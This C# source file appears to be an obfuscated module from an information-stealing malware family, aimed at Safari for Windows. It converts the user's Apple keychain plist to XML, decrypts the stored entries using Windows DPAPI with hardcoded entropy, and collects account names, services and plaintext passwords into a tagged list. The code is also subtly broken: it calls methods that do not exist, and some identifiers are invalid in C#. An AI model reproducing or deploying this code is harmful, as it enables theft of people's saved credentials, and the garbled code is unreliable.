using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using C6Zy;
using JSW1fecBOy;

namespace rk937aHHc
{
	public class Safari_for_Windows : EtbH
	{
		public Safari_for_Windows()
		{
			this.wcG8CheC = "Safari for Windows";
		}

		public string wcG8CheC { get; set; }

		public List<WTitxI2m> Grab()
		{
			List<WTitxI2m> result;
			try
			{
				string plutilPath =
					Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) +
					"\\Common Files\\Apple\\Apple Application Support\\plutil.exe";

				string keychainPath =
					Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +
					"\\Apple Computer\\Preferences\\keychain.plist";

				string output = null;

				if (!this.xBXuvzNIwrH(plutilPath, keychainPath, ref output))
				{
					result = null;
				}
				else
				{
					result = this.JJyVQffx1(output.Remove(output.Length - 2));
				}
			}
			catch
			{
				result = new List<WTitxI2m>();
			}
			return result;
		}

		private List<WTitxI2m> JJyVQffx1(string plistXmlPath)
		{
			List<WTitxI2m> list = new List<WTitxI2m>();

			try
			{
				string xml = File.ReadAllText(plistXmlPath);
				string arrayContent = Regex.Split(xml, "<array>")[1];
				string[] dicts = Regex.Split(arrayContent, "<dict>");

				foreach (string dict in dicts)
				{
					try
					{
						string data1 = g3Vt7T2gk5.1b9(dict, "<string>", "</string>", 5);
						string data2 = g3Vt7T2gk5.1b9(dict, "<string>", "</string>", 0);

						string base64Data =
							g3Vt7T2gk5.1b9(dict, "<data>", "</data>", 0);

						byte[] encryptedBytes = Convert.FromBase64String(base64Data);

						string decryptedPassword = this.16gy(encryptedBytes);

						list.Add(new WTitxI2m
						{
							data1 = data1,                 // 계정명 / 사용자명
							data2 = data2,                 // 서비스 / 서버
							data3 = decryptedPassword,     // 복호화된 비밀번호
							data4 = this.wcG8CheC          // 출처 태그
						});
					}
					catch
					{
					}
				}
			}
			catch
			{
			}

			return list;
		}

		private string DecryptAppleKeychain(byte[] encryptedData)
		{
			byte[] entropy = new byte[]
			{
				29,172,168,248,211,184,72,62,72,125,62,10,98,7,221,38,
				230,103,129,3,231,178,19,165,176,121,238,79,15,65,21,237,
				123,20,140,229,75,70,13,193,142,254,214,231,39,117,6,139,
				73,0,220,15,48,160,158,253,9,133,241,200,170,117,193,8,
				5,121,1,226,151,216,175,128,56,96,11,113,14,104,83,119,
				47,15,97,246,29,142,143,92,178,61,33,116,64,75,181,6,
				110,171,122,189,139,169,126,50,143,110,6,36,217,41,164,
				165,190,38,35,253,238,241,76,15,116,94,88,251,145,116,
				239,145,99,111,109,46,97,112,112,108,101,46,83,97,102,
				97,114,105
			};

			byte[] decrypted = ProtectedData.Unprotect(
				encryptedData,
				entropy,
				DataProtectionScope.CurrentUser
			);

			return Encoding.UTF8.GetString(decrypted, 4, decrypted.Length - 4);
		}

		private bool xBXuvzNIwrH(string plutilPath,string keychainPlistPath,ref string outputXmlPath)
		{
			outputXmlPath = null;
			if (!File.Exists(plutilPath))
				return false;

			outputXmlPath = Path.Combine(
				Path.GetTempPath(),
				"fixed_keychain.xml"
			);

			Process process = new Process();
			process.StartInfo.FileName = plutilPath;
			process.StartInfo.Arguments =
				" -convert xml1 -s -o \"" +
				outputXmlPath +
				"\" \"" +
				keychainPlistPath +
				"\"";

			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.UseShellExecute = false;

			process.Start();
			process.WaitForExit();

			return process.StandardOutput.ReadToEnd().Length == 0;
		}

	
		private string CtYBKv(ref string outputPath, string path)
		{
			outputPath = path;
			return path;
		}
	}
}
